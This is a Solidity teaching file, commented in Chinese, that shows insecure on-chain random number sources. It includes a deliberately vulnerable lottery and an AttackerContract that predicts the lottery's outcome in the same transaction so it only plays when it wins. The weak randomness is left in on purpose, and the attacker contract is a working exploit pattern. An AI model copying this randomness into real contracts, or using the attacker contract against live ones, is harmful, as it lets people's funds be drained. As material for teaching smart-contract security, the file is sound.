// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title UnsafeRandomGenerator
 * @dev 演示不安全的随机数生成方法 - 仅用于测试，不要在生产环境使用！
 */
contract UnsafeRandomGenerator {
    
    // 事件：记录生成的随机数
    event RandomNumberGenerated(address indexed caller, uint256 randomNumber, string method);
    
    /**
     * @dev 使用block.timestamp生成随机数 - 极不安全
     * 矿工可以操纵时间戳，且在同一区块内调用会得到相同结果
     */
    function getRandomFromTimestamp() external returns (uint256) {
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp)));
        emit RandomNumberGenerated(msg.sender, random, "timestamp");
        return random;
    }
    
    /**
     * @dev 使用blockhash生成随机数 - 不安全
     * 只能获取最近256个区块的hash，且矿工可以影响
     */
    function getRandomFromBlockhash() external returns (uint256) {
        uint256 random = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1))));
        emit RandomNumberGenerated(msg.sender, random, "blockhash");
        return random;
    }
    
    /**
     * @dev 使用block.difficulty生成随机数 - 不安全
     * 随着EIP-4399，difficulty将被替换
     */
    function getRandomFromDifficulty() external returns (uint256) {
        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty)));
        emit RandomNumberGenerated(msg.sender, random, "difficulty");
        return random;
    }
    
    /**
     * @dev 使用组合方式生成随机数 - 仍然不安全
     * 矿工仍然可以预测和操纵这些值
     */
    function getRandomFromCombined() external returns (uint256) {
        uint256 random = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    blockhash(block.number - 1),
                    block.difficulty,
                    block.coinbase,
                    block.number
                )
            )
        );
        emit RandomNumberGenerated(msg.sender, random, "combined");
        return random;
    }
    
    /**
     * @dev 获取一个指定范围内的随机数（1-100）
     */
    function getRandomInRange() external returns (uint256) {
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
        uint256 result = (random % 100) + 1; // 1-100
        emit RandomNumberGenerated(msg.sender, result, "range");
        return result;
    }
    
    /**
     * @dev 演示如何被操纵的简单彩票 - 极其不安全！
     */
    function unsafeLottery() external payable {
        require(msg.value == 0.01 ether, "Send exactly 0.01 ETH");
        
        // 使用不安全的随机数决定是否中奖
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
        
        if (random % 10 == 0) { // 10%的中奖概率
            payable(msg.sender).transfer(address(this).balance);
        }
    }
    
    /**
     * @dev 获取合约余额
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title AttackerContract
 * @dev 演示如何攻击不安全的随机数合约
 */
contract AttackerContract {
    UnsafeRandomGenerator public target;
    
    constructor(address _target) {
        target = UnsafeRandomGenerator(_target);
    }
    
    /**
     * @dev 攻击者可以在同一交易中预测并利用随机数
     */
    function attackLottery() external payable {
        // 攻击者可以在调用前计算出结果
        uint256 predictedRandom = uint256(keccak256(abi.encodePacked(block.timestamp, address(this))));
        bool willWin = (predictedRandom % 10 == 0);
        
        if (willWin) {
            target.unsafeLottery{value: 0.01 ether}();
        }
    }
    
    /**
     * @dev 攻击者可以重放交易直到获得期望的结果
     */
    function attackUntilWin() external {
        // 在实际攻击中，攻击者可以不断尝试直到成功
        for(uint i = 0; i < 10; i++) {
            try target.unsafeLottery{value: 0.01 ether}() {
                // 如果成功，退出循环
                break;
            } catch {
                // 如果失败，继续尝试
                continue;
            }
        }
    }
    
    // 接收ETH
    receive() external payable {}
}

/**
 * @title WhyUnsafeRandom
 * @dev 解释为什么这些方法不安全
 */
contract WhyUnsafeRandom {
    
    /**
     * @dev 演示为什么block.timestamp不安全
     * 矿工可以在15秒内任意选择时间戳
     */
    function timestampManipulation() external view {
        // 矿工可以选择任何他们认为有利的时间戳
        uint256 minerChosenTimestamp = block.timestamp;
        // 这可能导致可预测的"随机"数
    }
    
    /**
     * @dev 演示为什么blockhash不安全
     */
    function blockhashManipulation() external view {
        // 只能获取最近256个区块的hash
        bytes32 previousBlockhash = blockhash(block.number - 1);
        // 矿工知道这些值，可以预测结果
    }
    
    /**
     * @dev 演示为什么msg.sender不安全
     */
    function senderManipulation() external view {
        // 攻击者可以部署多个合约或使用不同地址
        address attacker = msg.sender;
        // 攻击者可以选择最有利的地址
    }
}